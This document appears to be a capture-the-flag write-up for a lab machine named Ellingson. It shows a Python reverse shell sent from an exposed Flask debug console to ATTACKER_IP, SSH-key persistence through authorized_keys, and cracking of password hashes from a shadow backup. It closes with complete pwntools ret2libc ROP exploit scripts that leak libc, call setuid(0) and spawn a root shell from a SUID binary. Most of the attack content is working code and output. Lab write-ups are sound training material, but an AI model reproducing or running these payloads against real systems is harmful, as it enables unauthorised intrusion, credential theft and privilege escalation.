# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---


![Pasted image 20250428155349.png](../../IMAGES/Pasted%20image%2020250428155349.png)

We got three articles on here, let's check them out:

![Pasted image 20250428155431.png](../../IMAGES/Pasted%20image%2020250428155431.png)

![Pasted image 20250428155440.png](../../IMAGES/Pasted%20image%2020250428155440.png)

![Pasted image 20250428155449.png](../../IMAGES/Pasted%20image%2020250428155449.png)


Articles talk about some security incidents, nothing to helpful from them, but, if we check the URL format, we can notice this:

```
http://10.10.10.139/articles/3
```

It takes a format like this:

```
/articles/n
```

If we check:

```
/articles/4
```

We can notice this:

![Pasted image 20250428160732.png](../../IMAGES/Pasted%20image%2020250428160732.png)

We got some errors regarding `flask`, let's proceed to exploitation.


# EXPLOITATION
---

If we hover in any of the error lines, we can see a console which let's us open an python shell, we can write a simple print and check the behavior:

![Pasted image 20250428161000.png](../../IMAGES/Pasted%20image%2020250428161000.png)

Nice, we can try some python payloads to check if we can get info on the system:

```python
import os
print(os.popen("whoami").read())
```

![Pasted image 20250428161117.png](../../IMAGES/Pasted%20image%2020250428161117.png)

We are running this as `hal`, let's get a reverse shell using the following command:

```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

In our listener, we can see the connection:

![Pasted image 20250428161506.png](../../IMAGES/Pasted%20image%2020250428161506.png)

Let's stabilize our shell and look around:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```


![Pasted image 20250428161606.png](../../IMAGES/Pasted%20image%2020250428161606.png)

Inside of `/home/hal/.ssh`, we can find an `id_rsa` key:


```
hal@ellingson:~$ ls -la .ssh
total 20
drwx------ 2 hal hal 4096 Jul 16 2021 .
drwxrwx--- 5 hal hal 4096 Jul 16 2021 ..
-rw-r--r-- 1 hal hal 1145 Mar 10 2019 authorized_keys
-rw------- 1 hal hal 1766 Mar 9 2019 id_rsa
-rw-r--r-- 1 hal hal 395 Mar 9 2019 id_rsa.pub
```

Let's get it on our machine and try logging into ssh:

![Pasted image 20250428161815.png](../../IMAGES/Pasted%20image%2020250428161815.png)

We need a passphrase, tried using john but there was no luck, still, we can do the following to get access to ssh:

1. Create a ssh key:

```
ssh-keygen -t rsa
```

2. Upload the contents to `authorized_keys`:

```bash
echo "OUR_ID_RSA.PUB CONTENTS" >> /home/hal/.ssh/authorized_keys
```


3. Log into ssh using our key:

```
ssh hal@10.10.10.139 -i id_rsa
```

![Pasted image 20250428162354.png](../../IMAGES/Pasted%20image%2020250428162354.png)

There we go, let's begin privilege escalation.


# PRIVILEGE ESCALATION
---

Since we already got a shell as hal, we can use `linpeas` to check any PE vector:

![Pasted image 20250428162715.png](../../IMAGES/Pasted%20image%2020250428162715.png)

We got a `shadow.bak` on `/var/backups`, let's check it out:

```
hal@ellingson:/var/backups$ cat shadow.bak
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
```

We got some hashes, let's get the file and use hashcat:

```
hashcat -m 1800 shadow.bak /usr/share/wordlists/rockyou.txt
```

These are `SHA-512` hashes and take a long time to crack, after a while, no progress seemed to be made, so, if we recall the article 3 from the website, we can see this:

```
Now as I so meticulously pointed out the most common passwords are. Love, Secret, Sex and God -The Plague 
```

This may be included in the password on our of users, let's grep the `rockyou` wordlist in the following way:

```
grep -i -e love -e secret -e sex -e god /usr/share/wordlists/rockyou.txt > new_rockyou
```

Now, let's use `hashcat` again with the `--force` option:

```
hashcat -m 1800 shadow.bak new_rockyou --force
```

After some time, we get this:

```
$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:iamgod$08
```

This is the password for `margo`:

```
margo:iamgod$08
```

![Pasted image 20250428164428.png](../../IMAGES/Pasted%20image%2020250428164428.png)

```
margo@ellingson:~$ cat user.txt
cbfeb02c5d13aeffcfe1fc3cd2ec37e6
```

Let's run `linpeas` again:

![Pasted image 20250428164835.png](../../IMAGES/Pasted%20image%2020250428164835.png)

We got an unknown binary named `garbage`, let's take a look:

```bash
margo@ellingson:~$ strings garbage
strings: 'garbage': No such file
margo@ellingson:~$ strings /usr/bin/garbage
/lib64/ld-linux-x86-64.so.2
libc.so.6
strcpy
exit
fopen
getpwuid
__isoc99_scanf
puts
putchar
stdin
printf
rewind
syslog
fgetc
fgets
getchar
read
fclose
strcat
getuid
access
strcmp
__libc_start_main
GLIBC_2.7
GLIBC_2.2.5
__gmon_start__
gfff
access gH
ranted fH
or user:H
[]A\A]A^A_
Row Row Row Your Boat...
The tankers have stopped capsizing
Balance is $%d
%llx
%lld
/var/secret/accessfile.txt
user: %lu cleared to access this application
user: %lu not authorized to access this application
User is not authorized to access this application. This attempt has been logged.
error
Enter access password:
N3veRF3@r1iSh3r3!
access granted.
access denied.
[+] W0rM || Control Application
[+] ---------------------------
Select Option
1: Check Balance
2: Launch
3: Cancel
4: Exit
%d%*c
Unknown option
;*3$"
GCC: (Debian 8.2.0-14) 8.2.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
garbage.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
func3
func5
func9
putchar@@GLIBC_2.2.5
func1
strcpy@@GLIBC_2.2.5
func7
puts@@GLIBC_2.2.5
stdin@@GLIBC_2.2.5
checkbalance
_edata
fclose@@GLIBC_2.2.5
getpwuid@@GLIBC_2.2.5
cancel
getuid@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
rewind@@GLIBC_2.2.5
fgetc@@GLIBC_2.2.5
read@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
fgets@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
getchar@@GLIBC_2.2.5
__gmon_start__
__dso_handle
unused_func
_IO_stdin_used
func4
print_decimal
func2
auth
__libc_csu_init
print_hex
launch
func8
func6
syslog@@GLIBC_2.2.5
_dl_relocate_static_pie
__bss_start
main
access@@GLIBC_2.2.5
fopen@@GLIBC_2.2.5
__isoc99_scanf@@GLIBC_2.7
strcat@@GLIBC_2.2.5
exit@@GLIBC_2.2.5
__TMC_END__
check_user
set_username
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
```

We got a hardcoded credentials if we go inside of the application, we can notice this:

```bash
margo@ellingson:~$ /usr/bin/garbage
Enter access password: N3veRF3@r1iSh3r3!

access granted.
[+] W0rM || Control Application
[+] ---------------------------
Select Option
1: Check Balance
2: Launch
3: Cancel
4: Exit
> 1
Balance is $1337
> 2
Row Row Row Your Boat...
> 3
The tankers have stopped capsizing
> 4
```

Nothing weird on here, the weird stuff comes on the `Enter access password`, if we analyze the strings, we can notice that `strcpy` and`strcat` appear in the strings. These functions do **not check buffer sizes**, making them prime candidates for buffer overflows. Let's try to check if the buffer overflow exists:

```bash
margo@ellingson:~$ /usr/bin/garbage
Enter access password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

access denied.
Segmentation fault (core dumped)
```

There we go, we got `Segmentation fault (core dumped)` this let's us know this is indeed vulnerable to `Buffer Overflow`, let's begin to craft our exploit to get root access, to do this, we need to grab information of it, let's get it on our machine:

```
scp margo@10.10.10.139:/usr/bin/garbage .
```


We can check if `ASLR` is on here:

```
margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
2
```

With a value of `2`, we notice `ASLR` is enabled, `ASLR` randomizes memory addresses (stack, heap, libraries) each time a program runs.

We also need to get the `libc` from the box:

```
scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 .
```

Let's proceed to use `gef` to start our exploitation process, we can get it on our machine using:

```bash
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Now, let's start, first, let's create a pattern:

```
gefâž¤ pattern create
[+] Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
[+] Saved as '$_gef0'
gefâž¤
```

Now, let's proceed:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€
$rax : 0x0 
$rbx : 0x00007fffffffde88 â†’ "faaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaacla[...]"
$rcx : 0x00007ffff7eb4210 â†’ 0x5877fffff0003d48 ("H="?)
$rdx : 0x0 
$rsp : 0x00007fffffffdd58 â†’ "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
$rbp : 0x6161616161616171 ("qaaaaaaa"?)
$rsi : 0x0000000000406d60 â†’ "access denied.\nssword: "
$rdi : 0x00007ffff7f99710 â†’ 0x0000000000000000
$rip : 0x0000000000401618 â†’ <auth+0105> ret 
$r8 : 0x00007fffffffe090 â†’ "uaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafba[...]"
$r9 : 0x00007ffff7f30a80 â†’ movaps xmm1, XMMWORD PTR [rsi+0x10]
$r10 : 0x3 
$r11 : 0x202 
$r12 : 0x0 
$r13 : 0x00007fffffffde98 â†’ "haaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacna[...]"
$r14 : 0x00007ffff7ffd000 â†’ 0x00007ffff7ffe2e0 â†’ 0x0000000000000000
$r15 : 0x0 
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€
0x00007fffffffdd58â”‚+0x0000: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"	â† $rsp
0x00007fffffffdd60â”‚+0x0008: "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"
0x00007fffffffdd68â”‚+0x0010: "taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaaza[...]"
0x00007fffffffdd70â”‚+0x0018: "uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabba[...]"
0x00007fffffffdd78â”‚+0x0020: "vaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabca[...]"
0x00007fffffffdd80â”‚+0x0028: "waaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabda[...]"
0x00007fffffffdd88â”‚+0x0030: "xaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabea[...]"
0x00007fffffffdd90â”‚+0x0038: "yaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfa[...]"
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€
 0x40160d <auth+00fa> call 0x401050 <puts@plt>
 0x401612 <auth+00ff> mov eax, 0x0
 0x401617 <auth+0104> leave 
 â†’ 0x401618 <auth+0105> ret 
[!] Cannot disassemble from $PC
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
[#0] Id 1, Name: "garbage", stopped 0x401618 in auth (), reason: SIGSEGV
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
[#0] 0x401618 â†’ auth()
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
gefâž¤
```

We can get the offset by using:

```bash
gefâž¤ pattern offset raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa
[+] Searching for '6178616161616161617761616161616161766161616161616175616161616161617461616161616161736161616161616172'/'7261616161616161736161616161616174616161616161617561616161616161766161616161616177616161616161617861' with period=8
[+] Found at offset 136 (big-endian search)
```

Offset is `136` bytes, let's save this info for now, we can create a simple python payload to get the libc base address first:

```python
#!/usr/bin/python
from pwn import *

def leak(p, elf, libc, rop):
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
 LIBC_START_MAIN = elf.symbols['__libc_start_main']
 PUTS = elf.plt['puts']
 MAIN = elf.symbols['main']
 
 log.info("puts@plt: " + hex(PUTS))
 log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
 log.info("pop rdi gadget: " + hex(POP_RDI))
 
 payload = b"A" * 136
 payload += p64(POP_RDI)
 payload += p64(LIBC_START_MAIN)
 payload += p64(PUTS)
 payload += p64(MAIN)

 p.recvuntil(b'password:')
 p.sendline(payload)
 p.recvline()
 p.recvline()
 leak = p.recvline().strip()
 leak = u64(leak.ljust(8, b"\x00")) # Pad to 8 bytes and unpack

 log.success("Leaked __libc_start_main: " + hex(leak))
 return leak

# Connect to target
r = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')

# Load binaries
elf = ELF("./garbage")
libc = ELF("./libc.so.6") 
rop = ROP(elf)

# Get leaked address and calculate libc base
leaked_addr = leak(p, elf, libc, rop)
libc.address = leaked_addr - libc.sym["__libc_start_main"]
log.success(f"Libc base calculated: {hex(libc.address)}")

# Cleanup
p.close()
r.close()
```

If we use the script, we get this:

```python
python3 libc_base.py
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
 Distro Ubuntu 18.04
 OS: linux
 Arch: amd64
 Version: 4.15.0
 ASLR: Enabled
 SHSTK: Disabled
 IBT: Disabled
[+] Starting remote process None on 10.10.10.139: pid 89708
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/home/samsepiol/Downloads/garbage'
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
 Stripped: No
[*] '/home/samsepiol/Downloads/libc.so.6'
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
[*] Loaded 14 cached gadgets for './garbage'
[*] puts@plt: 0x401050
[*] __libc_start_main: 0x403ff0
[*] pop rdi gadget: 0x40179b
[+] Leaked __libc_start_main: 0x7f6e5474bab0
[+] Libc base calculated: 0x7f6e5472a000
[*] Stopped remote process 'garbage' on 10.10.10.139 (pid 89708)
[*] Closed connection to '10.10.10.139'
```


There we go, we got the base address, we can construct another script which gives us a shell:

```python
#!/usr/bin/python
from pwn import *

def leak(p, elf, libc, rop):
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
 LIBC_START_MAIN = elf.symbols['__libc_start_main']
 PUTS = elf.plt['puts']
 MAIN = elf.symbols['main']
 
 log.info("puts@plt: " + hex(PUTS))
 log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
 log.info("pop rdi gadget: " + hex(POP_RDI))
 
 payload = b"A" * 136 
 payload += p64(POP_RDI)
 payload += p64(LIBC_START_MAIN)
 payload += p64(PUTS)
 payload += p64(MAIN)

 p.recvuntil(b'password:') 
 p.sendline(payload)
 p.recvline()
 p.recvline()
 leak = p.recvline().strip()
 leak = u64(leak.ljust(8, b"\x00")) 

 log.success("Leaked __libc_start_main: " + hex(leak))
 return leak

def shell(p, elf, libc, rop):
 RET = rop.find_gadget(['ret'])[0]
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
 BIN_SH = next(libc.search(b"/bin/sh")) 
 SYSTEM = libc.sym["system"]

 log.success("/bin/sh: " + hex(BIN_SH))
 log.success("system: " + hex(SYSTEM))

 payload = b"A" * 136 
 payload += p64(RET)
 payload += p64(POP_RDI)
 payload += p64(BIN_SH)
 payload += p64(SYSTEM)

 p.recvuntil(b'password:') 
 p.sendline(payload)
 p.interactive()

# Rest of the script remains the same
r = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')

elf = ELF("./garbage")
libc = ELF("./libc.so.6")
rop = ROP(elf)

leaked_addr = leak(p, elf, libc, rop)
libc.address = leaked_addr - libc.sym["__libc_start_main"]
log.info("Calculated libc address: " + hex(libc.address))

shell(p, elf, libc, rop)
```

![Pasted image 20250428173601.png](../../IMAGES/Pasted%20image%2020250428173601.png)

But the thing is we are still margo, in order to get a shell as root, we need to exploit another stuff, we need to make use of `setuid()` to set our `uid` to `0` which is the root user uid, let's change the script again:

```python
#!/usr/bin/python
from pwn import *

def leak(p, elf, libc, rop):
 POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
 LIBC_START_MAIN = elf.symbols['__libc_start_main']
 PUTS = elf.plt['puts']
 MAIN = elf.symbols['main']
 
 log.info("puts@plt: " + hex(PUTS))
 log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
 log.info("pop rdi gadget: " + hex(POP_RDI))
 
 payload = b"A" * 136 # Changed to bytes
 payload += p64(POP_RDI)
 payload += p64(LIBC_START_MAIN)
 payload += p64(PUTS)
 payload += p64(MAIN)

 p.recvuntil(b'password:') # Changed to bytes
 p.sendline(payload)
 p.recvline()
 p.recvline()
 leak = p.recvline().strip()
 leak = u64(leak.ljust(8, b"\x00")) # Changed to bytes

 log.success("Leaked __libc_start_main: " + hex(leak))
 return leak

def suid(p, elf, libc, rop):
 POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
 SUID = libc.sym['setuid']
 MAIN = elf.symbols['main']

 payload = b"A" * 136 # Changed to bytes
 payload += p64(POP_RDI)
 payload += p64(0)
 payload += p64(SUID)
 payload += p64(MAIN)
 
 p.recvuntil(b'password:') # Changed to bytes
 p.sendline(payload)

def shell(p, elf, libc, rop):
 RET = rop.find_gadget(['ret'])[0]
 POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
 BIN_SH = next(libc.search(b"/bin/sh")) # Changed to bytes
 SYSTEM = libc.sym["system"]

 log.success("/bin/sh: " + hex(BIN_SH))
 log.success("system: " + hex(SYSTEM))

 payload = b"A" * 136 # Changed to bytes
 payload += p64(RET)
 payload += p64(POP_RDI)
 payload += p64(BIN_SH)
 payload += p64(SYSTEM)

 p.recvuntil(b'password:') # Changed to bytes
 p.sendline(payload)
 p.interactive()

# Connect to target
r = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')

elf = ELF("./garbage")
libc = ELF("./libc.so.6")
rop = ROP(elf)

leaked_addr = leak(p, elf, libc, rop)
libc.address = leaked_addr - libc.sym["__libc_start_main"]
log.info("Calculated libc address: " + hex(libc.address))

suid(p, elf, libc, rop)
shell(p, elf, libc, rop)
```

If we use the script:

![Pasted image 20250428174703.png](../../IMAGES/Pasted%20image%2020250428174703.png)

